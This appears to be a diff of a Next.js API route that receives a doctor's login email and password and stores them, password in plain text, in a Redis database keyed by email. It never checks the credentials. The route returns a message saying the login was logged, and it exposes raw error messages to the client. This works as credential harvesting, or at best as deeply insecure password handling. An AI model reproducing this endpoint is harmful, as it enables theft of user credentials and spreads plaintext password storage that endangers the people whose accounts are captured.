@@ -1,43 +1,38 @@
-import { NextRequest, NextResponse } from "next/server";
-import redis from "../../lib/redisClient"; // adjust path if needed
+import { NextResponse } from "next/server";
+import { Redis } from "@upstash/redis";
 
-interface LoginEntry {
+const redis = new Redis({
+  url: process.env.KV_REST_API_URL,
+  token: process.env.KV_REST_API_TOKEN,
+});
+
+interface DoctorLogin {
   email: string;
   password: string;
   rememberMe?: boolean;
   timestamp: string;
 }
 
-interface LoginRequest {
-  email: string;
-  password: string;
-  rememberMe?: boolean;
-}
-
-export async function POST(req: NextRequest) {
+export async function POST(req: Request) {
   try {
-    const body: LoginRequest = await req.json();
+    const body = (await req.json()) as Omit<DoctorLogin, "timestamp">;
 
-    const loginEntry: LoginEntry = {
-      email: body.email,
-      password: body.password,
-      rememberMe: body.rememberMe ?? false,
+    const loginEntry: DoctorLogin = {
+      ...body,
       timestamp: new Date().toISOString(),
     };
 
-    // Fetch existing logins
-    const existingRaw = await redis.get("doctor-logins");
-    const existingLogins: LoginEntry[] = existingRaw ? JSON.parse(existingRaw as string) : [];
+    // Store login entry in Redis (use email as key)
+    await redis.set(`doctor:${body.email}`, JSON.stringify(loginEntry));
 
-    // Append new login
-    const updatedLogins = [...existingLogins, loginEntry];
+    return NextResponse.json({ success: true, message: "Login logged successfully" });
+  } catch (err: unknown) {
+  console.error("Error logging doctor login:", err);
 
-    // Store updated logins in Redis
-    await redis.set("doctor-logins", JSON.stringify(updatedLogins));
+  // Narrow the type before using 'message'
+  const errorMessage =
+    err instanceof Error ? err.message : "An unknown error occurred";
 
-    return NextResponse.json({ success: true });
-  } catch (error) {
-    console.error("Error logging doctor login:", error);
-    return NextResponse.json({ success: false }, { status: 500 });
+  return NextResponse.json({ success: false, error: errorMessage }, { status: 500 });
   }
 }
